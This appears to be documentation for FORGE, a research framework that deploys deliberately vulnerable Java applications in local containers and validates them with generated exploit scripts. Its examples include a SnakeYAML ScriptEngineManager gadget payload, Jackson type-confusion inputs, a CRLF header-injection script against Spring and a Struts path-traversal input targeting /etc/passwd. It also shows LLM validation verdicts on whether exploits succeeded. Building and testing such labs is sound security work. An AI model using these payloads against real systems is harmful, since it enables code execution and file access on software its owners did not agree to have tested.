# Real-World Vulnerability Examples

This document provides comprehensive examples of using FORGE for common vulnerability research scenarios, demonstrating the framework's capabilities across different vulnerability types and frameworks.

## Quick Reference

| Vulnerability Type | Example Package | CVE | Framework | Complexity |
| ------------------- | --------------- | --- | --------- | ---------- |
| **Deserialization** | `org.yaml:snakeyaml` | CVE-2022-1471 | Spring Boot | ⭐⭐ |
| **JSON Processing** | `com.fasterxml.jackson.core:jackson-databind` | CVE-2020-36518 | Spring Boot | ⭐⭐⭐ |
| **XML External Entity** | `org.dom4j:dom4j` | CVE-2020-10683 | Spring Boot | ⭐⭐ |
| **Remote Code Execution** | `org.apache.struts:struts2-core` | CVE-2021-31805 | Apache Struts | ⭐⭐⭐⭐ |
| **Server-Side Template** | `org.springframework:spring-expression` | CVE-2022-22963 | Spring Boot | ⭐⭐⭐ |

## Example 1: YAML Deserialization (SnakeYAML)

### Vulnerability Overview

**CVE-2022-1471**: SnakeYAML's Constructor class allows arbitrary code execution via deserialization of untrusted YAML data.

**Impact**: Remote Code Execution, Data Exfiltration, System Compromise

### Complete Workflow

```bash
# Generate and deploy vulnerable application
python src/main.py workflow -p org.yaml:snakeyaml --limit 1 --auto-run --validate

# Expected output:
# ✓ Blueprint created: CVE-2022-1471 SnakeYAML Deserialization
# ✓ Container built: vulnapp-org-yaml-snakeyaml-abc123
# ✓ Container running on port 8086
# ✓ Validation completed: Vulnerability demonstrated
```

### Manual Testing

```bash
# Basic connectivity test
curl http://localhost:8086/

# Test vulnerable endpoint with safe payload
curl -X POST http://localhost:8086/api/vulnerable \
  -H "Content-Type: text/plain" \
  -d "name: John Doe"

# Test with malicious YAML payload (actual payload from generated script)
curl -X POST http://localhost:8086/api/vulnerable \
  -H "Content-Type: text/plain" \
  -d "payload: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8000\"]]]]"

# Expected response: "Successfully deserialized: {payload=javax.script.ScriptEngineManager@...}"
```

### Advanced Exploitation

```bash
# View generated exploit script
ls data/exploit_scripts/CVE-2022-1471_*

# Manual script execution
python3 data/exploit_scripts/CVE-2022-1471_snakeyaml_exploit.py http://localhost:8086

# View validation results in monitoring data
ls data/monitoring/validation_results/
cat data/monitoring/validation_results/<blueprint-id>_*_validation.json
```

### Expected Validation Results

```json
{
  "blueprint_id": "b2d964aa-5d4e-4eb5-92f8-b3ae09518e54",
  "container_id": "c0acb084ff4d94a13e24199fbae1d2ae80e017acf2496764fd772548507dfe7c",
  "cve_id": "CVE-2022-1471",
  "package_name": "org.yaml:snakeyaml",
  "vulnerability_triggered": true,
  "confidence_score": 0.8,
  "detected_impacts": [
    "HTTP Response Body: Successfully deserialized: {payload=javax.script.ScriptEngineManager@291ea515}",
    "Script Errors (stderr): [INFO] Vulnerability triggered successfully!",
    "Object created: javax.script.ScriptEngineManager",
    "Exit Code: 0"
  ],
  "exploit_indicators": [
    "Successfully deserialized",
    "Object created",
    "Constructor invoked",
    "ScriptEngineManager"
  ]
}
```

## Example 2: Jackson Databind Deserialization

### Vulnerability Overview

**CVE-2020-36518**: Jackson Databind allows polymorphic deserialization leading to remote code execution through gadget chains.

**Impact**: Remote Code Execution, Privilege Escalation

### Workflow Execution

```bash
# Generate Jackson vulnerability with enhanced validation
python src/main.py workflow \
  -p com.fasterxml.jackson.core:jackson-databind \
  --limit 1 \
  --auto-run \
  --validate \
  --framework-type spring-boot
```

### Framework-Specific Testing

```bash
# Test JSON deserialization endpoint
curl -X POST http://localhost:8087/api/vulnerable \
  -H "Content-Type: application/json" \
  -d '{
    "@class": "java.util.HashMap",
    "name": "test",
    "value": "payload"
  }'

# Test with different payload structure
curl -X POST http://localhost:8087/api/vulnerable \
  -H "Content-Type: application/json" \
  -d '{
    "@type": "java.lang.Object",
    "data": "malicious_payload"
  }'
```

### PoC Integration Example

The framework automatically extracts and adapts real Jackson exploits:

```python
# Example of actual generated exploit script structure
import urllib.request
import urllib.parse
import urllib.error
import sys
import logging

class VulnerabilityTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.timeout = 30

    def test_vulnerability(self):
        """Main testing logic"""
        endpoint = "/api/vulnerable"
        url = urllib.parse.urljoin(self.base_url, endpoint)
        
        payload = self.generate_vulnerability_payload()
        headers = {"Content-Type": "application/json"}
        data = payload.encode('utf-8')
        
        req = urllib.request.Request(url, data=data, headers=headers, method='POST')
        
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as response:
                result = response.read().decode('utf-8')
                return self.check_vulnerability_indicators(result)
        except Exception as e:
            logging.error(f"Request failed: {e}")
            return False

    def generate_vulnerability_payload(self):
        """Generate payload specific to the vulnerability type"""
        return '{"@type": "java.util.HashMap", "data": "test"}'

    def check_vulnerability_indicators(self, response_content):
        """Analyze response content for vulnerability evidence.

        Note: Deserialization vulnerabilities manifest in the response BODY,
        not HTTP headers. This differs from HTTP-based vulnerabilities like
        RFD (Reflected File Download) where headers must be inspected.
        """
        indicators = ["Successfully deserialized", "HashMap", "Vulnerability triggered"]
        return any(indicator in response_content for indicator in indicators)

if __name__ == "__main__":
    tester = VulnerabilityTester(sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080")
    result = tester.test_vulnerability()
    sys.exit(0 if result else 1)
```

## Example 3: HTTP Response Splitting (Spring Framework RFD)

### Vulnerability Overview

**GHSA-6r3c-xf4w-jxjm (CWE-113)**: Spring Framework Reflected File Download (RFD) vulnerability allows attackers to inject malicious CRLF sequences into HTTP response headers, potentially causing the browser to download and execute attacker-controlled content.

**Impact**: Arbitrary file download, potential code execution in user context

**Vulnerability Type**: `http_response_splitting` - HTTP header-based vulnerability

### Complete Workflow

```bash
# Generate and deploy Spring Framework RFD vulnerability
python src/main.py workflow \
  -p org.springframework:spring-web \
  --cve-ids org.springframework:spring-web:GHSA-6r3c-xf4w-jxjm \
  --framework-type spring-boot \
  --limit 1 \
  --auto-run \
  --validate

# Expected output:
# ✓ Blueprint created: GHSA-6r3c-xf4w-jxjm Spring Framework RFD
# ✓ Vulnerability type: http_response_splitting
# ✓ Container built and running
# ✓ Validation completed with header inspection
```

### Manual Testing

```bash
# Basic connectivity test
curl -I http://localhost:8085/

# Test vulnerable endpoint with safe filename
curl -I "http://localhost:8085/download?filename=test.txt"

# Test with malicious CRLF injection in filename parameter
curl -I "http://localhost:8085/download?filename=malicious%0A%0DContent-Disposition:%20attachment;filename=evil.exe"

# Check response headers for CRLF injection
curl -v "http://localhost:8085/download?filename=test%0Amalicious:header" 2>&1 | grep "Content-Disposition"
```

### Header Validation Code Example

The key difference for HTTP response splitting vulnerabilities is that validation must inspect **HTTP headers**, not just the response body:

```python
# Example of actual generated exploit script with header validation
import urllib.request
import urllib.parse
import sys
import logging

class RFDVulnerabilityTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.timeout = 30

    def test_vulnerability(self):
        """Test RFD vulnerability with header inspection."""
        endpoint = "/download"

        # Generate payload with CRLF injection
        malicious_filename = "test.txt%0A%0DX-Malicious-Header:injected"

        params = urllib.parse.urlencode({"filename": malicious_filename})
        url = f"{self.base_url}{endpoint}?{params}"

        req = urllib.request.Request(url, method='GET')

        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as response:
                # CRITICAL: Check response HEADERS, not body
                return self.check_vulnerability_indicators(response)
        except Exception as e:
            logging.error(f"Request failed: {e}")
            return False

    def check_vulnerability_indicators(self, response_obj):
        """Analyze HTTP response HEADERS for CRLF injection evidence.

        IMPORTANT: For HTTP response splitting vulnerabilities, the vulnerability
        manifests in HTTP HEADERS, not the response body. Must check:
        - Content-Disposition header for malicious filename reflection
        - Presence of CRLF sequences (%0A, %0D, \\r, \\n)
        - Injected headers in response
        """
        # Get Content-Disposition header
        content_disp = response_obj.headers.get('Content-Disposition', '')

        # Check for malicious filename reflection in header
        indicators = [
            "test.txt" in content_disp,           # Filename reflected
            "%0A" in content_disp,                 # CRLF sequence (URL encoded)
            "%0D" in content_disp,                 # CRLF sequence (URL encoded)
            "\\r" in content_disp,                 # CRLF sequence (escaped)
            "\\n" in content_disp,                 # CRLF sequence (escaped)
        ]

        # Check if X-Malicious-Header was injected
        if 'X-Malicious-Header' in response_obj.headers:
            logging.info("CRLF injection successful: X-Malicious-Header found")
            return True

        # Check Content-Disposition for injection
        if any(indicators):
            logging.info(f"CRLF injection detected in Content-Disposition: {content_disp}")
            return True

        return False

if __name__ == "__main__":
    tester = RFDVulnerabilityTester(sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8085")
    result = tester.test_vulnerability()

    if result:
        print("[SUCCESS] Vulnerability demonstrated: CRLF injection in HTTP headers")
        sys.exit(0)
    else:
        print("[FAILURE] Vulnerability not detected")
        sys.exit(1)
```

### Expected Validation Results

```json
{
  "blueprint_id": "e6db0a4e-7a12-4d41-bd95-fd7013b9e0d7",
  "cve_id": "GHSA-6r3c-xf4w-jxjm",
  "package_name": "org.springframework:spring-web",
  "vulnerability_type": "http_response_splitting",
  "vulnerability_triggered": true,
  "confidence_score": 0.8,
  "detected_impacts": [
    "Malicious filename reflected in Content-Disposition header",
    "CRLF sequence (%0A) successfully injected into Content-Disposition header",
    "CRLF injection (%0A) in HTTP response headers",
    "Reflected malicious filename in Content-Disposition header"
  ],
  "exploit_indicators": [
    "CRLF injection",
    "Content-Disposition header manipulation",
    "Header injection successful"
  ],
  "llm_validation": {
    "vulnerability_demonstrated": true,
    "confidence_score": 0.95,
    "reasoning": "The exploit successfully injected CRLF sequences into the Content-Disposition HTTP response header. The malicious filename parameter was reflected without sanitization, allowing header injection. This demonstrates the application is vulnerable to HTTP response splitting attacks.",
    "evidence_found": [
      "Malicious filename reflected in Content-Disposition header",
      "CRLF sequences present in response headers",
      "Header injection successful"
    ]
  }
}
```

## Example 4: Understanding LLM Validation Reasoning

### Validation Scenario: Path Traversal with OS Permission Denial

**CVE-2024-53677**: Apache Struts file upload path traversal vulnerability

### Understanding Triggered vs Exploited

The new LLM validation system understands the critical distinction between:

- **Vulnerability TRIGGERED**: Application's vulnerable code executed
- **Full EXPLOITATION**: Complete attack chain succeeded

```bash
# Generate and validate path traversal vulnerability
python src/main.py workflow -p org.apache.struts:struts2-core --cve-ids org.apache.struts:struts2-core:CVE-2024-53677 --auto-run --validate --limit 1
```

### Validation Output Analysis

**Scenario**: Exploit sends `../../../../etc/passwd` as filename parameter

**Application Response**:

```sh
Error uploading file: uploads/../../../../etc/passwd (Permission denied)
```

**Old Validation Logic (Incorrect)**:

- Saw "Permission denied" error
- Matched against failure indicators
- **Result**: FALSE NEGATIVE (incorrectly reported as failure)

**New LLM Validation Logic (Correct)**:

```json
{
  "vulnerability_demonstrated": true,
  "confidence_score": 0.90,
  "reasoning": "The application accepted the directory traversal path (../../../../etc/passwd) without validation and attempted to access the system file. The 'Permission denied' error occurred at the OS level when trying to write to /etc/passwd, which is protected by file system permissions. This demonstrates the application is vulnerable - it did not validate or sanitize the user-provided path before processing.",
  "application_behavior": "Accepted malicious path traversal input and processed it without validation, attempting to access /etc/passwd",
  "external_factors": "Operating system file permissions blocked the actual file write operation",
  "evidence_found": [
    "Error message shows full traversal path: ../../../../etc/passwd",
    "Application attempted to access system file /etc/passwd",
    "OS-level permission denial, not application-level input validation",
    "Path traversal mechanism successfully reached unintended location"
  ],
  "indicators_detected": [
    "FileNotFoundException: uploads/../../../../etc/passwd",
    "Permission denied (OS-level)",
    "Path traversal pattern processed"
  ]
}
```

**Key Insight**: The LLM correctly identified that:

1. **Application accepted** the malicious path without validation (VULNERABLE ✓)
2. **OS blocked** the actual file access (environmental protection, not app security)
3. **Vulnerability was demonstrated** even though full exploitation was blocked

### Manual Verification

```bash
# Check validation results
cat data/monitoring/validation_results/<blueprint-id>_*_validation.json | jq '.llm_validation.reasoning'

# Review container logs to see the error
cat data/monitoring/container_logs/<blueprint-id>_*_.log | grep "Permission denied"

# The logs confirm: application tried to access /etc/passwd
```

### Why This Matters

**For Security Researchers**:

- Accurately identifies vulnerable applications even when exploitation is blocked by external factors
- Reduces false negatives in vulnerability detection
- Provides detailed reasoning for validation decisions

**For DevOps/Security Teams**:

- Clear distinction between application vulnerabilities and environmental protections
- Helps prioritize fixing actual application flaws vs relying on OS-level protections
- Better understanding of defense-in-depth effectiveness

## Additional Examples

### Testing Different Vulnerability Types

```bash
# Test Jackson deserialization
python src/main.py workflow -p com.fasterxml.jackson.core:jackson-databind --limit 1 --auto-run

# Test with different frameworks
python src/main.py workflow -p org.springframework:spring-core --framework-type spring-boot --auto-run
```

## Batch Processing Examples

### Multiple Vulnerability Testing

```bash
# Process multiple related packages
python src/main.py workflow \
  -p "org.yaml:snakeyaml,com.fasterxml.jackson.core:jackson-databind,org.springframework:spring-expression" \
  --limit 2 \
  --auto-run \
  --background

# Monitor all running containers
podman ps --format "table {{.Names}}\t{{.Image}}\t{{.Ports}}\t{{.Status}}"

# Validate all deployments
for container in $(podman ps --format "{{.Names}}" | grep vulnapp); do
  port=$(podman port $container | cut -d: -f2)
  echo "Testing $container on port $port"
  curl -s http://localhost:$port/ | head -1
done
```

### Framework Comparison Testing (Not extensively tested yet)

```bash
# Test same vulnerability across frameworks
python src/main.py workflow -p org.springframework:spring-core --framework-type spring-boot --auto-run
python src/main.py workflow -p org.springframework:spring-core --framework-type micronaut --auto-run

# View blueprint statistics
python src/main.py stats
```

## Data Analysis

### Viewing Results

```bash
# Check validation results  
ls data/monitoring/validation_results/
cat data/monitoring/validation_results/*_validation.json

# View generated exploit reports
ls data/monitoring/exploit_reports/
cat data/monitoring/exploit_reports/*_report.md

# Check container logs
ls data/monitoring/container_logs/
tail -f data/monitoring/container_logs/*.log
```

## Container Management

### Managing Multiple Containers

```bash
# Check running containers
podman ps --format "table {{.Names}}\t{{.Ports}}\t{{.Status}}"

# Stop all running containers
python src/main.py stop-all

# Monitor resource usage
podman stats --no-stream
```
